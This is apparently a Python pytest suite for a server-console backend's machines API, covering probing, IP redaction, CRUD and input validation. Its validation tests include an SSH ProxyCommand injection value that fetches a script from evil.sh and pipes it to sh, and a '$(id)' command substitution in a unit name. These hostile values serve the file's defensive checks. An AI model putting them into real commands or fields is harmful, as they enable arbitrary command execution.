# -*- coding: utf-8 -*-
"""Regression tests for GET /api/machines + /api/health warnings。

契约见 .agents/contracts/backend/config-writeback.md；字段见 docs/configuration.md。
不触网：探活统一 monkeypatch check_tcp。
"""
import datetime
import json
import os
import pathlib
import re
import sys
import textwrap

import pytest

BACKEND_DIR = pathlib.Path(__file__).resolve().parent
sys.path.insert(0, str(BACKEND_DIR))

os.environ["CONSOLE_AUTH_ENABLED"] = "false"

import app as console_app  # noqa: E402
import machine_config as mc  # noqa: E402
import node_traffic as nt  # noqa: E402
import probe_cache as pc  # noqa: E402
import renewals as rn  # noqa: E402


def test_machine_renewal_retains_history_without_countdown(monkeypatch):
    monkeypatch.setattr(mc, "get_machine", lambda _id: {"renewal_ref": "old"})
    monkeypatch.setattr(rn, "get_renewal", lambda *args, **kwargs: {
        "id": "old", "status": "ended", "expires_at": "2020-01-01", "cost": 79,
    })
    result = console_app._machine_renewal("test")
    assert result["status"] == "ended" and result["cost"] == 79
    assert result["expires_at"] == "2020-01-01" and result["days_left"] is None


@pytest.fixture(autouse=True)
def _clean_caches(monkeypatch):
    # PG-02：机器探活受采集门禁约束（Q1）。本文件测的是本机探活与投影，
    # 所以按 authority 运行；client 的转交行为在 test_pg_app_wiring.py 里断言。
    monkeypatch.setenv("CONSOLE_INSTANCE_ROLE", "authority")
    mc.invalidate()
    pc.invalidate()
    yield
    mc.invalidate()
    pc.invalidate()


@pytest.fixture()
def client(tmp_path, monkeypatch, pg_online):
    # PG-05 集成收口：`/api/machines` 的续费关联与流量/时序都走 PG（决策 D3），
    # 夹具必须真连 PG；`DB_PATH` 仍传但已被各域忽略，只为兼容旧调用点。
    monkeypatch.setattr(console_app, "DB_PATH", str(tmp_path / "console.db"))
    monkeypatch.setattr(console_app, "ASSETS_PATH", str(tmp_path / "assets.yaml"))
    # 探活不出网：默认全通
    monkeypatch.setattr(
        pc, "check_tcp", lambda host, port, timeout=3: (True, "Port Open")
    )
    return console_app.app.test_client()


def _write_assets(monkeypatch, tmp_path, body):
    path = tmp_path / "assets.yaml"
    path.write_text(textwrap.dedent(body), encoding="utf-8")
    monkeypatch.setattr(console_app, "ASSETS_PATH", str(path))
    return path


class TestMachinesEndpoint:
    def test_returns_all_machines_in_registry_order(self, client):
        rows = client.get("/api/machines").get_json()
        assert [r["id"] for r in rows] == ["nas", "txy", "aly", "us", "kr", "sg", "gz"]

    def test_contract_fields_present(self, client):
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        kr = rows["kr"]
        for field in (
            "id", "label", "role", "provider", "os", "region", "public_host",
            "capabilities", "probe", "traffic_quota_gb", "probe_status",
            "probe_msg", "probe_ts", "renewal",
        ):
            assert field in kr, field
        assert kr["role"] == "node"
        assert kr["capabilities"] == ["beszel", "ssh"]
        # 前端 node-card 读 probe.type / probe.port，形状不能塌成扁平字段
        assert kr["probe"] == {"type": "tcp", "port": 62037}

    def test_never_leaks_addresses(self, client):
        """地址与密钥不进接口：前端不需要，泄露面白扩大。"""
        for row in client.get("/api/machines").get_json():
            assert "tailscale" not in row
            assert "ssh" not in row
            assert "ssh_key" not in row

    def test_node_probe_status_reflects_tcp_result(self, client, monkeypatch):
        monkeypatch.setattr(
            pc, "check_tcp", lambda host, port, timeout=3: (False, "timed out")
        )
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        assert rows["kr"]["probe_status"] == "down"
        assert "timed out" in rows["kr"]["probe_msg"]
        assert rows["kr"]["probe_ts"] is not None

    def test_server_probe_targets_tailscale(self, client, monkeypatch):
        calls = []
        monkeypatch.setattr(
            pc, "check_tcp",
            lambda host, port, timeout=3: calls.append((host, port)) or (True, "Port Open"),
        )
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        assert rows["txy"]["probe_status"] == "up"
        # server 与 node 都走 tailscale IP：mihomo fake-ip 会吃掉公网探测，
        # tailnet 直连同一端口才有真实握手（probe_cache docstring）
        assert ("100.64.0.30", 22) in calls       # txy（server）
        assert ("100.64.0.40", 22) in calls      # aly（server）
        assert ("100.64.0.60", 22) in calls    # gz（SSH-only server）
        assert ("100.64.0.50", 62037) in calls   # kr（node，tailnet 直连）

    def test_probe_result_is_cached_between_requests(self, client, monkeypatch):
        calls = []
        monkeypatch.setattr(
            pc, "check_tcp",
            lambda host, port, timeout=3: calls.append(1) or (True, "Port Open"),
        )
        client.get("/api/machines")
        first = len(calls)
        assert first == 7       # 七台都有 probe 配置，含新增 GZ 的 tcp 22
        client.get("/api/machines")
        assert len(calls) == first   # TTL 内不再打网络

    def test_force_bypasses_cache(self, client, monkeypatch):
        calls = []
        monkeypatch.setattr(
            pc, "check_tcp",
            lambda host, port, timeout=3: calls.append(1) or (True, "Port Open"),
        )
        client.get("/api/machines")
        client.get("/api/machines?force=1")
        assert len(calls) == 14

    def test_renewal_null_when_ref_dangling_or_unset(self, client):
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        # 测试库是全新 console.db，machines.yaml 的 renewal_ref 指向的条目都不存在 → 全 null
        assert all(r["renewal"] is None for r in rows.values())

    def test_renewal_populated_when_ref_matches(
        self, client, tmp_path, monkeypatch
    ):
        due = datetime.date.today() + datetime.timedelta(days=30)
        rn.create_renewal(
            {
                "id": "kr-lightsail",
                "name": "Lightsail KR",
                "kind": "vps",
                "cycle": "yearly",
                "expires_at": due.isoformat(),
                "cost": 79,
                "currency": "CNY",
            },
            db_path=console_app.DB_PATH,
        )
        machines = tmp_path / "machines.yaml"
        machines.write_text(
            textwrap.dedent("""\
                - id: kr
                  label: 光帆 KR
                  role: node
                  renewal_ref: kr-lightsail
                """),
            encoding="utf-8",
        )
        monkeypatch.setenv("CONSOLE_MACHINES_PATH", str(machines))
        mc.invalidate()

        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        renewal = rows["kr"]["renewal"]
        assert renewal["id"] == "kr-lightsail"
        assert renewal["expires_at"] == due.isoformat()
        assert renewal["days_left"] == 30
        # B0：价格 chip 与剩余价值用（§3.3）
        assert renewal["cost"] == 79
        assert renewal["currency"] == "CNY"
        assert renewal["cycle"] == "yearly"

    def test_dangling_renewal_ref_is_null_not_error(
        self, client, tmp_path, monkeypatch
    ):
        machines = tmp_path / "machines.yaml"
        machines.write_text(
            "- id: kr\n  role: node\n  renewal_ref: nope-does-not-exist\n",
            encoding="utf-8",
        )
        monkeypatch.setenv("CONSOLE_MACHINES_PATH", str(machines))
        mc.invalidate()
        resp = client.get("/api/machines")
        assert resp.status_code == 200
        assert resp.get_json()[0]["renewal"] is None


# ---------------------------------------------------------------------------
# P1 安全修复：/api/machines 与 /api/machines/<id> 的 probe_msg 不得原样带 IPv4
# （monitor_events.scrub_detail 已有 IPv4 正则与测试口径，这里只锁 API 投影边界）。
# 直接 monkeypatch check_machine_probe 本身（而非更底层的 check_tcp），用设计文档
# 同款虚构地址 100.64.0.9 覆盖 success/timeout/refused 三种真实会出现的 msg 形态，
# 不写任何真实 Tailscale 地址进新增断言。
# ---------------------------------------------------------------------------

class TestMachineProbeMsgRedaction:
    @pytest.mark.parametrize(
        "raw_msg",
        [
            "tcp 100.64.0.9:1234 ok 12.3ms",
            "tcp 100.64.0.9:1234 timed out",
            "tcp 100.64.0.9:1234 [Errno 61] Connection refused",
        ],
    )
    def test_list_probe_msg_has_no_ipv4(self, client, monkeypatch, raw_msg):
        monkeypatch.setattr(
            pc, "check_machine_probe",
            lambda machine_id, force=False, db_path=None: (
                "up", raw_msg, "2026-09-07T00:00:00Z",
            ),
        )
        resp = client.get("/api/machines")
        rows = resp.get_json()
        assert rows, "夹具应至少有一台机器"
        for row in rows:
            assert "100.64.0.9" not in row["probe_msg"]
            assert "***" in row["probe_msg"]
        # 全文零 IPv4：不止查 probe_msg 字段，防止脱敏漏了其它路径拼进去的地址
        full_text = json.dumps(rows)
        assert re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", full_text) is None

    def test_detail_probe_msg_has_no_ipv4(self, client, monkeypatch):
        monkeypatch.setattr(
            pc, "check_machine_probe",
            lambda machine_id, force=False, db_path=None: (
                "down", "tcp 100.64.0.9:22 timed out", "2026-09-07T00:00:00Z",
            ),
        )
        resp = client.get("/api/machines/kr")
        row = resp.get_json()
        assert "100.64.0.9" not in row["probe_msg"]
        assert "***" in row["probe_msg"]
        full_text = json.dumps(row)
        assert re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", full_text) is None

    def test_empty_probe_msg_survives_scrub_unchanged(self, client, monkeypatch):
        """unknown（无 probe 配置）时 msg 恒为空串；scrub 不应把它变成别的东西。"""
        monkeypatch.setattr(
            pc, "check_machine_probe",
            lambda machine_id, force=False, db_path=None: ("unknown", "", None),
        )
        rows = client.get("/api/machines").get_json()
        assert all(row["probe_msg"] == "" for row in rows)

    def test_non_address_failure_text_is_preserved(self, client, monkeypatch):
        """非地址类失败文案（如语义检查用语）不该被误伤——回归 scrub_detail 既有契约。"""
        monkeypatch.setattr(
            pc, "check_machine_probe",
            lambda machine_id, force=False, db_path=None: (
                "down", "Status 500 body mismatch", "2026-09-07T00:00:00Z",
            ),
        )
        rows = client.get("/api/machines").get_json()
        assert all(row["probe_msg"] == "Status 500 body mismatch" for row in rows)


class TestHealthWarnings:
    def test_no_warnings_when_assets_machines_known(
        self, client, tmp_path, monkeypatch
    ):
        _write_assets(monkeypatch, tmp_path, """\
            - name: console-brain
              machine: nas
            - name: edge-kr
              machine: kr
            """)
        payload = client.get("/api/health").get_json()
        assert "warnings" not in payload

    def test_warns_on_unknown_machine_id(self, client, tmp_path, monkeypatch):
        _write_assets(monkeypatch, tmp_path, """\
            - name: legacy
              machine: oldbox
            """)
        payload = client.get("/api/health").get_json()
        assert any("oldbox" in w for w in payload["warnings"])

    def test_missing_assets_file_does_not_warn(
        self, client, tmp_path, monkeypatch
    ):
        monkeypatch.setattr(
            console_app, "ASSETS_PATH", str(tmp_path / "absent.yaml")
        )
        payload = client.get("/api/health").get_json()
        assert "warnings" not in payload


class TestMachineActionEndpoint:
    """E3：node 白名单动作。SSH 一律拦住，断言的是「谁被放行、谁被拒」。"""

    @pytest.fixture()
    def sent(self, monkeypatch):
        calls = []

        def fake(machine, action):
            calls.append((machine, action))
            return True, "ok"

        monkeypatch.setattr(console_app.sm, "node_action", fake)
        return calls

    def test_whitelisted_action_runs_and_is_audited(self, client, sent):
        resp = client.post(
            "/api/machine/action", json={"machine": "kr", "action": "restart-singbox"}
        )
        assert resp.status_code == 200
        assert resp.get_json() == {"ok": True, "output": "ok"}
        assert sent == [("kr", "restart-singbox")]
        rows = client.get("/api/oplog").get_json()
        assert (rows[0]["host"], rows[0]["svc"], rows[0]["action"]) == (
            "kr", "sing-box", "restart",
        )
        assert rows[0]["result"] == "Success"

    @pytest.mark.parametrize(
        "action", ["restart", "reboot", "", None, "restart-singbox2", "logs"]
    )
    def test_unknown_action_is_400_and_never_reaches_ssh(self, client, sent, action):
        resp = client.post(
            "/api/machine/action", json={"machine": "kr", "action": action}
        )
        assert resp.status_code == 400
        assert sent == []

    def test_failure_is_reported_and_audited(self, client, monkeypatch):
        monkeypatch.setattr(
            console_app.sm, "node_action", lambda m, a: (False, "unit not found")
        )
        resp = client.post(
            "/api/machine/action", json={"machine": "kr", "action": "restart-singbox"}
        )
        assert resp.get_json()["ok"] is False
        assert "Failed" in client.get("/api/oplog").get_json()[0]["result"]

    def test_success_invalidates_probe_cache(self, client, sent, monkeypatch):
        calls = []
        monkeypatch.setattr(
            pc, "check_tcp",
            lambda host, port, timeout=3: calls.append(1) or (True, "Port Open"),
        )
        client.get("/api/machines")
        before = len(calls)
        client.post(
            "/api/machine/action", json={"machine": "kr", "action": "restart-singbox"}
        )
        client.get("/api/machines")
        # kr 被清了缓存要重探，sg 仍在 TTL 内
        assert len(calls) == before + 1


class TestMachineTrafficAndHistoryFields:
    def test_traffic_null_until_sampled(self, client):
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        assert rows["kr"]["traffic"] is None
        assert rows["nas"]["traffic"] is None

    def test_traffic_summary_after_sampling(self, client):
        gib = 1024 ** 3
        nt.record_sample("kr", "ens5", 0, 0, db_path=console_app.DB_PATH)
        # sent(出站) 100GiB + recv(入站) 60GiB：配额只算出站
        nt.record_sample("kr", "ens5", 100 * gib, 60 * gib, db_path=console_app.DB_PATH)
        traffic = {
            r["id"]: r["traffic"] for r in client.get("/api/machines").get_json()
        }["kr"]
        assert traffic["used_gb"] == 100.0
        assert traffic["recv_gb"] == 60.0
        assert traffic["quota_gb"] == 1000
        assert traffic["pct"] == 10.0

    def test_probe_history_grows_with_probes(self, client):
        first = {r["id"]: r for r in client.get("/api/machines").get_json()}
        assert len(first["kr"]["probe_history"]) == 1
        assert first["kr"]["probe_history"][0]["status"] == "up"
        # Q3：server 也有 probe，同样落时序
        assert len(first["nas"]["probe_history"]) == 1
        client.get("/api/machines?force=1")
        second = {r["id"]: r for r in client.get("/api/machines").get_json()}
        assert len(second["kr"]["probe_history"]) == 2

    def test_node_actions_exposed_only_for_nodes(self, client):
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        assert [a["key"] for a in rows["kr"]["actions"]] == ["restart-singbox"]
        for machine in ("nas", "txy", "aly", "us", "gz"):
            assert rows[machine]["actions"] == []


# ---------------------------------------------------------------------------
# B3：机器 CRUD（§5.3）。写测试一律指向 tmp machines.yaml，绝不碰仓库那份。
# ---------------------------------------------------------------------------

@pytest.fixture()
def sandbox_yaml(tmp_path, monkeypatch):
    """把 registry 指到临时 machines.yaml，写路径才不会改到真台账。"""
    path = tmp_path / "machines.yaml"
    path.write_text(
        textwrap.dedent("""\
            # 机器台账：占位头，断言写回后仍是契约头
            - id: kr
              label: 光帆 KR
              role: node
              provider: AWS Lightsail 韩国
              public_host: kr.sunxc.eu.cc
              tailscale: 100.64.0.50
              ssh: admin@100.64.0.50
              ssh_key: aws-kr.pem
              capabilities: [beszel, ssh]
              probe: { type: tcp, port: 62037 }
              traffic_quota_gb: 1000
            - id: sg
              label: 光帆 SG
              role: node
              public_host: sg.sunxc.eu.cc
              capabilities: [ssh]
            """),
        encoding="utf-8",
    )
    monkeypatch.setenv("CONSOLE_MACHINES_PATH", str(path))
    mc.invalidate()
    return path


class TestMachineDetailEndpoint:
    def test_detail_matches_list_projection(self, client, sandbox_yaml):
        row = client.get("/api/machines/kr").get_json()
        assert row["id"] == "kr"
        assert row["probe_status"] == "up"
        # 列表有的派生字段，详情一个不少
        for field in ("renewal", "traffic", "probe_history", "actions"):
            assert field in row
        assert [a["key"] for a in row["actions"]] == ["restart-singbox"]

    def test_detail_still_hides_addresses(self, client, sandbox_yaml):
        row = client.get("/api/machines/kr").get_json()
        for field in ("tailscale", "ssh", "ssh_key"):
            assert field not in row

    def test_full_exposes_edit_fields(self, client, sandbox_yaml):
        row = client.get("/api/machines/kr?full=1").get_json()
        assert row["tailscale"] == "100.64.0.50"
        assert row["ssh"] == "admin@100.64.0.50"
        # 只是 .ssh-console/ 内的文件名，私钥内容永不经 HTTP（§5.3 红线）
        assert row["ssh_key"] == "aws-kr.pem"
        assert "BEGIN" not in str(row)


    def test_full_degrades_to_empty_units_without_cache(
        self, client, sandbox_yaml, monkeypatch
    ):
        """Beszel 没缓存时表单退化成手打 unit 名，不该让编辑接口挂掉。"""
        import monitor_observability as mo

        monkeypatch.setitem(mo._cache, "data", None)
        assert client.get("/api/machines/kr?full=1").get_json()["discovered_units"] == []

    def test_unknown_machine_is_404(self, client, sandbox_yaml):
        assert client.get("/api/machines/nope").status_code == 404
        assert client.get("/api/machines/nope?full=1").status_code == 404

    def test_detail_not_swallowed_by_beszel_proxy(self, client, sandbox_yaml):
        """/api/machines/<id> 不是 Beszel 路径，必须由 console 自己应答。"""
        assert console_app._is_console_api("/api/machines/kr") is True


class TestMachineCreate:
    def test_create_writes_yaml_and_shows_in_list(self, client, sandbox_yaml):
        resp = client.post("/api/machines", json={
            "id": "hk",
            "label": "光帆 HK",
            "role": "node",
            "public_host": "hk.sunxc.eu.cc",
            "capabilities": ["ssh"],
            "probe": {"port": 62037},
        })
        assert resp.status_code == 200
        assert resp.get_json()["ok"] is True
        assert resp.get_json()["machine"]["id"] == "hk"
        assert "hk" in sandbox_yaml.read_text(encoding="utf-8")
        # 写完即刻可见：upsert 会 invalidate 缓存
        assert [r["id"] for r in client.get("/api/machines").get_json()] == [
            "kr", "sg", "hk",
        ]

    def test_duplicate_id_is_400(self, client, sandbox_yaml):
        resp = client.post("/api/machines", json={
            "id": "kr", "role": "node", "public_host": "x.example.com",
        })
        assert resp.status_code == 400
        assert "已存在" in resp.get_json()["error"]

    def test_invalid_payload_is_400_with_chinese_reason(self, client, sandbox_yaml):
        resp = client.post("/api/machines", json={
            "id": "hk", "role": "router", "public_host": "hk.example.com",
        })
        assert resp.status_code == 400
        assert "role" in resp.get_json()["error"]
        assert "hk" not in sandbox_yaml.read_text(encoding="utf-8")

    def test_ssh_option_injection_is_400(self, client, sandbox_yaml):
        """`-oProxyCommand=` 进 ssh argv 等于任意命令执行，必须在写路径就拦掉。"""
        resp = client.post("/api/machines", json={
            "id": "hk", "role": "node", "public_host": "hk.example.com",
            "ssh": "-oProxyCommand=curl evil.sh|sh",
        })
        assert resp.status_code == 400
        assert "ProxyCommand" not in sandbox_yaml.read_text(encoding="utf-8")

    def test_empty_body_is_400_not_500(self, client, sandbox_yaml):
        assert client.post("/api/machines", json={}).status_code == 400


class TestMachineUpdate:
    def test_update_persists_and_keeps_header(self, client, sandbox_yaml):
        resp = client.put("/api/machines/kr", json={
            "id": "kr",
            "label": "光帆 KR（改）",
            "role": "node",
            "public_host": "kr.sunxc.eu.cc",
            "tailscale": "100.64.0.50",
            "ssh": "admin@100.64.0.50",
            "ssh_key": "aws-kr.pem",
            "capabilities": ["beszel", "ssh"],
            "probe": {"port": 62037},
            "traffic_quota_gb": 2000,
        })
        assert resp.status_code == 200
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        assert rows["kr"]["label"] == "光帆 KR（改）"
        assert rows["kr"]["traffic_quota_gb"] == 2000
        text = sandbox_yaml.read_text(encoding="utf-8")
        assert text.startswith("# 机器台账")
        assert "renewal_ref 指向权威 PostgreSQL" in text

    def test_rename_is_400(self, client, sandbox_yaml):
        resp = client.put("/api/machines/kr", json={
            "id": "kr2", "role": "node", "public_host": "kr.sunxc.eu.cc",
        })
        assert resp.status_code == 400
        assert "改机器 id" in resp.get_json()["error"]
        assert [r["id"] for r in client.get("/api/machines").get_json()] == ["kr", "sg"]

    def test_update_unknown_is_400(self, client, sandbox_yaml):
        resp = client.put("/api/machines/hk", json={
            "id": "hk", "role": "node", "public_host": "hk.example.com",
        })
        assert resp.status_code == 400
        assert "不存在" in resp.get_json()["error"]

    def test_full_roundtrip_does_not_clear_addresses(self, client, sandbox_yaml):
        """按 ?full=1 读出来原样提交，tailscale/ssh/ssh_key 必须还在。"""
        before = client.get("/api/machines/kr?full=1").get_json()
        assert client.put("/api/machines/kr", json=before).status_code == 200
        after = client.get("/api/machines/kr?full=1").get_json()
        assert after == before


class TestMachineDelete:
    def test_delete_removes_from_list(self, client, sandbox_yaml, tmp_path, monkeypatch):
        _write_assets(monkeypatch, tmp_path, "- name: console-brain\n  machine: nas\n")
        assert client.delete("/api/machines/sg").status_code == 200
        assert [r["id"] for r in client.get("/api/machines").get_json()] == ["kr"]
        assert "sg" not in sandbox_yaml.read_text(encoding="utf-8")

    def test_delete_blocked_while_services_attached(
        self, client, sandbox_yaml, tmp_path, monkeypatch
    ):
        _write_assets(monkeypatch, tmp_path, """\
            - name: edge-kr
              machine: kr
            - name: singbox-kr
              machine: kr
            """)
        resp = client.delete("/api/machines/kr")
        assert resp.status_code == 400
        error = resp.get_json()["error"]
        assert "还有 2 个服务" in error
        assert "edge-kr" in error and "singbox-kr" in error
        # 防呆必须在写盘之前
        assert "id: kr" in sandbox_yaml.read_text(encoding="utf-8")

    def test_delete_unknown_is_400(self, client, sandbox_yaml, tmp_path, monkeypatch):
        _write_assets(monkeypatch, tmp_path, "- name: x\n  machine: nas\n")
        resp = client.delete("/api/machines/nope")
        assert resp.status_code == 400
        assert "不存在" in resp.get_json()["error"]

    def test_missing_assets_file_does_not_block_delete(
        self, client, sandbox_yaml, tmp_path, monkeypatch
    ):
        monkeypatch.setattr(console_app, "ASSETS_PATH", str(tmp_path / "absent.yaml"))
        assert client.delete("/api/machines/sg").status_code == 200


# ---------------------------------------------------------------------------
# J-B：systemd_units 展示白名单（Track J §4.1 / §6 B3）。写测试一律 sandbox yaml。
# ---------------------------------------------------------------------------

@pytest.fixture()
def sandbox_with_units(sandbox_yaml):
    """sg 预置 systemd_units + 手写未知键，kr 不带——两种形态都从 API 暴露。

    注意 `capabilities: [ssh]` 只出现在 sg；kr 是 `[beszel, ssh]`，替换不会误伤。
    """
    text = sandbox_yaml.read_text(encoding="utf-8")
    text = text.replace(
        "  capabilities: [ssh]\n",
        "  capabilities: [ssh]\n  systemd_units: [sing-box]\n  future_field: keep-me\n",
        1,
    )
    sandbox_yaml.write_text(text, encoding="utf-8")
    mc.invalidate()
    return sandbox_yaml


class TestSystemdUnitsApi:
    def test_list_contains_units_array_for_every_machine(self, client, sandbox_with_units):
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        assert rows["sg"]["systemd_units"] == ["sing-box"]
        assert rows["kr"]["systemd_units"] == []  # 无字段 = 空数组，不是缺键

    def test_full_detail_contains_units(self, client, sandbox_with_units):
        row = client.get("/api/machines/sg?full=1").get_json()
        assert row["systemd_units"] == ["sing-box"]

    def test_full_roundtrip_keeps_whitelist(self, client, sandbox_with_units):
        """编辑表单按 ?full=1 读出原样提交，白名单和手写未知键都不丢。"""
        before = client.get("/api/machines/sg?full=1").get_json()
        assert client.put("/api/machines/sg", json=before).status_code == 200
        after = client.get("/api/machines/sg?full=1").get_json()
        assert after["systemd_units"] == ["sing-box"]
        raw = {e["id"]: e for e in mc.load_machines_raw()}
        assert raw["sg"]["future_field"] == "keep-me"

    def test_update_writes_units_and_round_trips(self, client, sandbox_yaml):
        resp = client.put("/api/machines/kr", json={
            "id": "kr", "role": "node", "public_host": "kr.sunxc.eu.cc",
            "systemd_units": ["sing-box", "foo@bar.service"],
        })
        assert resp.status_code == 200
        assert resp.get_json()["machine"]["systemd_units"] == [
            "sing-box", "foo@bar.service",
        ]
        assert client.get("/api/machines/kr?full=1").get_json()[
            "systemd_units"
        ] == ["sing-box", "foo@bar.service"]

    def test_update_rejects_invalid_units_with_chinese_400(self, client, sandbox_yaml):
        resp = client.put("/api/machines/kr", json={
            "id": "kr", "role": "node", "public_host": "kr.sunxc.eu.cc",
            "systemd_units": ["evil$(id)"],
        })
        assert resp.status_code == 400
        assert "systemd unit" in resp.get_json()["error"]
        assert "evil" not in sandbox_yaml.read_text(encoding="utf-8")

    def test_create_accepts_units_array(self, client, sandbox_yaml):
        resp = client.post("/api/machines", json={
            "id": "hk", "role": "node", "public_host": "hk.sunxc.eu.cc",
            "systemd_units": ["sing-box"],
        })
        assert resp.status_code == 200
        assert resp.get_json()["machine"]["systemd_units"] == ["sing-box"]
        assert "systemd_units" in sandbox_yaml.read_text(encoding="utf-8")


# ---------------------------------------------------------------------------
# 家宽公网探测字段：请求路径只 peek 后台缓存；四个键恒在；msg 同一条脱敏契约
# ---------------------------------------------------------------------------

class TestPublicProbeProjection:
    FIELDS = (
        "public_probe_status", "public_probe_msg", "public_probe_ts", "public_probe_history",
    )

    @staticmethod
    def _seed(machine_id, status, msg, ts="2026-09-29T01:00:00Z"):
        """模拟后台调度已探过一轮：直接写公网缓存（请求路径只读它）。"""
        import time

        pc._public_cache[machine_id] = {
            "ts": time.time(), "status": status, "msg": msg, "ts_iso": ts,
        }

    def test_fields_present_and_unknown_before_first_round(self, client):
        rows = {r["id"]: r for r in client.get("/api/machines").get_json()}
        for mid in ("us", "kr", "sg"):
            assert rows[mid]["public_probe"] == {"type": "tcp", "port": 62037}
        for mid in ("nas", "txy", "aly"):
            assert rows[mid]["public_probe"] is None
        for row in rows.values():
            assert row["public_probe_status"] == "unknown"
            assert row["public_probe_msg"] == ""
            assert row["public_probe_ts"] is None
            assert row["public_probe_history"] == []

    def test_request_path_never_runs_public_probe(self, client, monkeypatch):
        """公网不通时一次探测要等满超时：列表、force 刷新、详情都不许同步探。"""
        def boom(*args, **kwargs):
            pytest.fail("请求路径不得发起家宽公网探测")

        monkeypatch.setattr(pc, "check_machine_public_probe", boom)
        monkeypatch.setattr(pc, "probe_all_public", boom)
        monkeypatch.setattr(pc, "_resolve_ipv4", boom)
        assert client.get("/api/machines").status_code == 200
        assert client.get("/api/machines?force=1").status_code == 200
        assert client.get("/api/machines/us").status_code == 200

    def test_projects_cached_result_and_its_own_history(self, client):
        import node_probe

        node_probe.record("kr:public", "down", None, "2026-09-29T00:55:00Z",
                          db_path=console_app.DB_PATH)
        node_probe.record("kr:public", "up", 181.2, "2026-09-29T01:00:00Z",
                          db_path=console_app.DB_PATH)
        self._seed("kr", "up", "tcp kr.sunxc.eu.cc:62037 ok 181.2ms")
        kr = {r["id"]: r for r in client.get("/api/machines").get_json()}["kr"]
        assert kr["public_probe_status"] == "up"
        assert kr["public_probe_msg"] == "tcp kr.sunxc.eu.cc:62037 ok 181.2ms"
        assert kr["public_probe_ts"] == "2026-09-29T01:00:00Z"
        assert [(h["status"], h["latency_ms"]) for h in kr["public_probe_history"]] == [
            ("down", None), ("up", 181.2),
        ]
        # 机器探活色带只有本次请求那一次 Tailscale 探测，公网样本不混进来
        assert len(kr["probe_history"]) == 1
        assert kr["probe_history"][0]["latency_ms"] != 181.2

    def test_unconfigured_machine_stays_unknown_even_with_stale_cache(self, client):
        """配置才是开关：撤掉 public_probe 后，缓存里的旧结果不再投影。"""
        self._seed("nas", "down", "tcp nas.example.test:62037 timed out")
        nas = {r["id"]: r for r in client.get("/api/machines").get_json()}["nas"]
        assert nas["public_probe_status"] == "unknown"
        assert nas["public_probe_msg"] == ""
        assert nas["public_probe_ts"] is None

    def test_public_msg_is_scrubbed_in_list_and_detail(self, client):
        self._seed("us", "down", "tcp 203.0.113.7:62037 timed out")
        rows = client.get("/api/machines").get_json()
        us = {r["id"]: r for r in rows}["us"]
        assert "203.0.113.7" not in us["public_probe_msg"]
        assert "***" in us["public_probe_msg"]
        assert re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", json.dumps(rows)) is None
        detail = client.get("/api/machines/us").get_json()
        assert re.search(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", json.dumps(detail)) is None

    def test_detail_matches_list(self, client):
        self._seed("sg", "down", "tcp sg.sunxc.eu.cc:62037 timed out")
        detail = client.get("/api/machines/sg").get_json()
        listed = {r["id"]: r for r in client.get("/api/machines").get_json()}["sg"]
        for field in self.FIELDS + ("public_probe",):
            assert detail[field] == listed[field], field
        assert detail["public_probe_status"] == "down"

    def test_edit_roundtrip_keeps_public_probe(self, client, sandbox_yaml):
        payload = client.get("/api/machines/kr?full=1").get_json()
        assert payload["public_probe"] is None
        payload["public_probe"] = {"type": "tcp", "port": 62037}
        assert client.put("/api/machines/kr", json=payload).status_code == 200
        before = client.get("/api/machines/kr?full=1").get_json()
        assert before["public_probe"] == {"type": "tcp", "port": 62037}
        assert client.put("/api/machines/kr", json=before).status_code == 200
        assert client.get("/api/machines/kr?full=1").get_json() == before
        assert "public_probe:" in sandbox_yaml.read_text(encoding="utf-8")

    def test_bad_public_probe_is_400_with_chinese_reason(self, client, sandbox_yaml):
        payload = client.get("/api/machines/kr?full=1").get_json()
        payload["public_probe"] = {"type": "udp", "port": 53}
        resp = client.put("/api/machines/kr", json=payload)
        assert resp.status_code == 400
        assert "public_probe.type" in resp.get_json()["error"]


class TestBackgroundPublicProbes:
    """_bg_public_probes：只在 authority 起线程；循环先探再睡，单轮异常不杀线程。"""

    @staticmethod
    def _capture_threads(monkeypatch):
        import threading

        started = []

        class FakeThread:
            def __init__(self, target=None, daemon=None, **kwargs):
                self.target, self.daemon = target, daemon

            def start(self):
                started.append(self)

        monkeypatch.setattr(threading, "Thread", FakeThread)
        return started

    def test_non_authority_starts_nothing(self, monkeypatch):
        monkeypatch.setenv("CONSOLE_INSTANCE_ROLE", "client")
        started = self._capture_threads(monkeypatch)
        console_app._bg_public_probes()
        assert started == []

    def test_loop_probes_first_then_sleeps_and_survives_errors(self, monkeypatch):
        import types

        monkeypatch.setenv("CONSOLE_PUBLIC_PROBE_INTERVAL", "120")
        started = self._capture_threads(monkeypatch)
        console_app._bg_public_probes()
        assert len(started) == 1
        assert started[0].daemon is True

        class Stop(Exception):
            pass

        order, outcomes = [], iter([RuntimeError("boom"), 3])

        def fake_probe_all_public(db_path=None):
            order.append("probe")
            outcome = next(outcomes)
            if isinstance(outcome, Exception):
                raise outcome
            return outcome

        def fake_sleep(seconds):
            order.append(("sleep", seconds))
            if len(order) == 4:
                raise Stop

        monkeypatch.setattr(pc, "probe_all_public", fake_probe_all_public)
        monkeypatch.setattr(console_app, "time", types.SimpleNamespace(sleep=fake_sleep))
        with pytest.raises(Stop):
            started[0].target()
        assert order == ["probe", ("sleep", 120), "probe", ("sleep", 120)]
